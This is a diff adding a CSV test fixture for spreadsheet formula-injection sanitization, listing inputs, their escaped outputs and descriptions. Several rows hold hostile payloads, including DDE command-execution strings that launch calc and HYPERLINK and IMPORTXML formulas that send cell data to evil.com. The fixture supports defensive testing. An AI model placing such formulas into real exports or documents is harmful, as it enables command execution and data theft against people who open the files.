@@ -1,0 +1,19 @@
+Test Name,Original Value,Sanitized Value,Protected,Description
+DDE Attack,'=CMD|'/C calc'!A0,'=CMD|'/C calc'!A0,YES,Attempts to execute Windows Calculator
+HYPERLINK Exfiltration,"'=HYPERLINK(""https://evil.com/""&A2,""Click me"")","""'=HYPERLINK(""""https://evil.com/""""&A2,""""Click me"""")""",YES,Attempts to exfiltrate data from cell A2
+SUM Formula,'@SUM(1+1)*cmd|/C calc!A0,'@SUM(1+1)*cmd|/C calc!A0,YES,Combines SUM with command execution
+Equals Sign,'=1+1,'=1+1,YES,Simple formula with equals sign
+Plus Sign,'+1+1,'+1+1,YES,Formula starting with plus
+Minus Sign,'-1+1,'-1+1,YES,Formula starting with minus
+At Sign,'@SUM(A1:A10),'@SUM(A1:A10),YES,Formula starting with @
+Tab Character,'	=1+1,'	=1+1,YES,Formula starting with tab
+Carriage Return,'=1+1,'=1+1,YES,Formula starting with carriage return
+Formula with Quotes,"'=CMD|""/C calc""!A0","""'=CMD|""""/C calc""""!A0""",YES,DDE with double quotes
+Formula with Comma,"'=CONCATENATE(""a"",""b"")","""'=CONCATENATE(""""a"""",""""b"""")""",YES,Formula containing commas
+Formula with Newline,"'=1+1
+malicious","""'=1+1
+malicious""",YES,Formula with newline
+IMPORTXML Attack,"'=IMPORTXML(CONCAT(""http://evil.com/?v="",A2), ""//a"")","""'=IMPORTXML(CONCAT(""""http://evil.com/?v="""",A2), """"//a"""")""",YES,Attempts to make external HTTP request
+Normal Text,John Doe,John Doe,YES,Regular customer name
+Email,user@example.com,user@example.com,YES,Regular email address
+Phone,'+1-555-0123,'+1-555-0123,YES,Phone number with plus (but not at start after trim)
